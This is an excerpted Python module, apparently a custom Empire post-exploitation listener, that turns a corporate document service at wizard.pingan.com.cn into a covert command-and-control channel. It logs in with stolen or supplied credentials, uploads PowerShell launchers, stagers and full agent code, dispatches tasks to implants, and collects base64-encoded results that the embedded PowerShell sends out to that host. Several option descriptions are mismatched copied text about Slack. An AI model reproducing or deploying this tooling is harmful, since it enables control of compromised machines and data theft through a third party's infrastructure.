...
class Listener:
    def __init__(self, mainMenu, params=[]):
        self.info = {
                'Name': 'Wizard',
                'Author': ['@tyraniter'],
                'Description': ('Starts a wizard.pingan listener.'),
        ...
        self.options = {
            ...
            'BaseFolder' : {
                'Description'   :   'The base wizard folder to use for comms.',
                'Required'      :   True,
                'Value'         :   'empire'
            },
            'StagingFolder' : {
            ...
            'LoginURL' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   True,
                'Value'         :   'http://wizard.pingan.com.cn/user-center-web/sso/v2/login.do'
            },
            'CheckURL' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   True,
                'Value'         :   'http://wizard.pingan.com.cn/alm/'
            },
            'UploadURL' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   True,
                'Value'         :   'http://wizard.pingan.com.cn/alm/api/file?uploadMarkdown'
            },
            'ListFolderURL' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   True,
                'Value'         :   'http://wizard.pingan.com.cn/alm/api/project?list'
            },
            'ListFileURL' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   True,
                'Value'         :   'http://wizard.pingan.com.cn/alm/api/file?list'
            },
            'DeleteFileURL' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   True,
                'Value'         :   'http://wizard.pingan.com.cn/alm/api/file?batchDelete'
            },
    ...
    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
        ...
        upload_url = listenerOptions['UploadURL']['Value']
        delete_file_url = listenerOptions['DeleteFileURL']['Value']
        ...
        if language.lower() == 'powershell':
            ...
            stager = stager.replace("REPLACE_UPLOAD_URL", upload_url)
            stager = stager.replace("REPLACE_DELETE_FILE_URL", delete_file_url)
    ...
    def generate_comms(self, listener_options, username, password, signature,token, redirect_uri, language=None):
        ...
        login_url = listener_options['LoginURL']['Value']
    ...
    $script:GetWebClient = {
        ...
        $wc.Headers.Add("X-XSRF-TOKEN", $Script:TokenObject.token.Split('|')[2]);
        $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
        $wc
    }
            """ % (token, username, password, signature,login_url)
    ...
    $script:SendMessage = {
        ...
        try {
            ...
            $RoutingPacket=[Convert]::ToBase64String($RoutingPacket);
            #$param="title=$ID&content=$RoutingPacket&fileType=txt&id=$($script:ResultFileID)";
            $param="{""projectId"":""$resultsFolder"",""title"":""$ID"",""content"":""$RoutingPacket"",""fileType"":""txt"",""id"":""$($script:ResultFileID)""}";
            write-host "upload result data $RoutingPacket";
            $raw = $wc.UploadString($uploadUrl, $param)
            $d=ConvertFrom-Json -InputObject $raw;
            $script:ResultFileID = $d.content.id;
            $script:ResultFileURL = $d.content.url;
    ...
    $script:GetTask = {
        try {
            ...
            if($script:TaskingFileURL){
                ...
                $param="{""projectId"":""$TaskingsFolder"",""title"":""$ID"",""content"":\"\"\"\",""fileType"":""txt"",""id"":""$($script:TaskingFileID)""}";
                write-host 'create task file';
                $raw = $wc.UploadString($uploadUrl,$param);
                $d=ConvertFrom-Json -InputObject $raw;
                $script:TaskingFileID = $d.content.id;
                $script:TaskingFileURL = $d.content.url;
...
"""
    ...
    def generate_agent(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language=None):
        ...
        if language == 'powershell':
            ...
            comms_code = self.generate_comms(listener_options, username, password, signature, token, redirect_uri, language)
    ...
    def start_server(self, listenerOptions):
        ...
        def get_token(name, pwd, signature):
            ...
            try:
                r = s.post(login_url, data=data,proxies = proxies)
                r_token = r.json()['data']
                return r_token
            except KeyError, e:
        ...
        def test_token(token):
            ...
            request = s.get(check_url, allow_redirects=False,proxies = proxies)
        ...
        def setup_folders():
            ...
            base_object = s.get(list_folder_url,proxies = proxies)

            for item in base_object.json()['content']['records']:
        ...
        def check_staging_files():
            data = {'projectId': workspaces[staging_folder]}
            search = s.post(list_file_url,json=data,proxies = proxies)
            for item in search.json()['content']['ref'].get('fileInfo',{}).values():
                staging_files[item['name']]=item['id']

        def check_tasking_files():
            data = {'projectId': workspaces[taskings_folder]}
            search = s.post(list_file_url,json=data,proxies = proxies)
            for item in search.json()['content']['ref'].get('fileInfo',{}).values():
                tasking_files[item['name'].split('.')[0]]=item    

        def check_result_files():
            data = {'projectId': workspaces[results_folder]}
            search = s.post(list_file_url,json=data,proxies = proxies)
            result_files.clear()
            for item in search.json()['content']['ref'].get('fileInfo',{}).values():
        ...
        def upload_launcher():
            ...
            data={
                'projectId':workspaces[staging_folder],
                'title':'LAUNCHER-PS',
                'content':ps_launcher,
                'fileType':'txt',
                'id': staging_files.get('LAUNCHER-PS.txt',''),
            }
            r = s.post(upload_url, json=data,proxies = proxies)
            if r.status_code == 200:
                ps_launcher_url = r.json()['content']['url']
            ...
            r = s.post(upload_url, json=data,proxies = proxies)
            if r.status_code == 200:
                py_launcher_url = r.json()['content']['url']
        ...
        def upload_stager():
            ...
            if r.status_code == 200:
                ps_stager_url = r.json()['content']['url']
            ...
            if r.status_code == 200:
                py_stager_url = r.json()['content']['url']
                #Different domain for some reason?
        ...
        login_url = listener_options['LoginURL']['Value']
        upload_url = listener_options['UploadURL']['Value']
        check_url = listener_options['CheckURL']['Value']
        list_folder_url = listener_options['ListFolderURL']['Value']
        list_file_url = listener_options['ListFileURL']['Value']
        delete_file_url = listener_options['DeleteFileURL']['Value']
        ...
        s.headers['X-XSRF-TOKEN']=token['tokenCas'].split('|')[2]
        ...
        while True:
            ...
            try: #Wrap the whole loop in a try/catch so one error won't kill the listener
                ...
                data = {'projectId': workspaces[staging_folder]}
                search = s.post(list_file_url,json=data,proxies = proxies)
                for item in search.json()['content']['ref']['fileInfo'].values(): #Iterate all items in the staging folder
                    try:
                        ...
                        if stage == '1': #Download stage 1, upload stage 2
                            ...
                            s.post(upload_url, json=data,proxies = proxies)
                        ...
                        if stage == '3': #Download stage 3, upload stage 4 (full agent code)
                            ...
                            agent_code = str(self.generate_agent(listener_options, username, password, agent_token['tokenCas'],
                                                            agent_token['tokenCas'], redirect_uri, lang))
                ...
                for agent_id in agent_ids: #Upload any tasks for the current agents
                    ...
                    if task_data:
                        try:
                            ...
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            data={
                                'projectId':workspaces[taskings_folder],
                                'title':agent_id,
                ...
                for item in result_files.values(): #For each file in the results folder
                    try:
                        ...
                        if not agent_id in agent_ids: #If we don't recognize that agent, upload a message to restage
                            ...
                            #data='RESTAGE'
                            data={'ids':[item['id']]}
                            s.post(delete_file_url, json=data,proxies = proxies)
                            continue

                        seen_time = datetime.fromtimestamp(item['updatedDate']/1000)
